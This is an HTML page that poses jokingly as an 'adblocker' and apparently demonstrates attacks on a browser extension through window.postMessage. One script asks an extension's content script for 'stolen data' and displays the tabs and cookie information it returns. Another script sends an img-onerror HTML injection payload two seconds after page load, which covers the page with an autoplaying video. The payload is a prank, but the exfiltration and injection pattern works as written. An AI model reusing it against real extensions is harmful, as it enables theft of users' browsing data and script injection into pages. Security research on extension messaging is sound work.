<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>A good addblocker bro</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; max-width: 700px; margin: auto; }
    button { padding: 12px 20px; font-size: 16px; margin: 10px 5px; cursor: pointer; }
    pre { background: #111; color: #0f0; padding: 15px; overflow: auto; max-height: 600px; }
    .status { font-weight: bold; margin: 10px 0; }
    .error { color: #ff6666; }
    .success { color: #66ff66; }
  </style>
</head>
<body>
  <h1>Addblocker 2.trustmebro</h1>

  <button onclick="requestStolenData()">Click to activate remove ads forever</button>
  <!-- <button onclick="simulateActivity()">Click also here plz</button> -->

  <div class="status" id="status">Status of the best addblocker</div>
  <pre id="result">Plz click brother I need to load...</pre>

  <script>
    const statusEl = document.getElementById('status');
    const resultEl = document.getElementById('result');

    let responseTimeout = null;

    function log(text, isError = false) {
      resultEl.textContent = text;
      statusEl.className = isError ? 'status error' : 'status success';
    }

    function requestStolenData() {
      statusEl.textContent = "Activating adblocker";
      statusEl.className = 'status';
      resultEl.textContent = "Removing ads\n";

      // Send request
      window.postMessage({ type: "REQUEST_STOLEN_DATA" }, "*");

      // Set timeout in case no response comes
      clearTimeout(responseTimeout);
      responseTimeout = setTimeout(() => {
        log("Why did you not download my adblocker?!?!?! 😡😡😡😡😡", true);
      }, 4000); // 4 seconds timeout
    }

    function simulateActivity() {
      localStorage.setItem("sessionToken", "super-secret-token-xyz123");
      statusEl.textContent = "✅ Simulated login done";
    }

    // Receive data from content script
    window.addEventListener("message", (event) => {
      if (event.data.type === "STOLEN_DATA_RESPONSE") {
        clearTimeout(responseTimeout); // Cancel timeout

        const data = event.data.data || {};

        if (data.error) {
          log("Extension Error: " + data.error, true);
        } else if (data.tabs || data.cookiesCount !== undefined) {
          statusEl.textContent = "Trust me I need these information to do addblock 😈😈😈";
          resultEl.textContent = JSON.stringify(data, null, 2);
        } else {
          log("⚠️ Received empty or invalid data from extension", true);
        }
      }
    });

    // Optional: Auto try once when page loads
    window.onload = () => {
      setTimeout(() => {
        // You can remove this if you don't want auto-request
        // requestStolenData();
      }, 800);
    };
  </script>
  <script>
    { setTimeout(() => {  
      window.postMessage({
        type: "SET_CONFIG",
        config: {
          showBanner: `
          <img src="x" onerror="
            const overlay = document.createElement('div');
            overlay.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:#000;display:flex;align-items:center;justify-content:center';

            const iframe = document.createElement('iframe');
            iframe.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1';
            iframe.style.cssText = 'width:80vw;height:80vh;border:none';
            iframe.allow = 'autoplay; encrypted-media';

            overlay.appendChild(iframe);
            document.body.appendChild(overlay);
          ">
        `
        }
      }, "*");
    }, 2000); }
  </script>
</body>
</html>
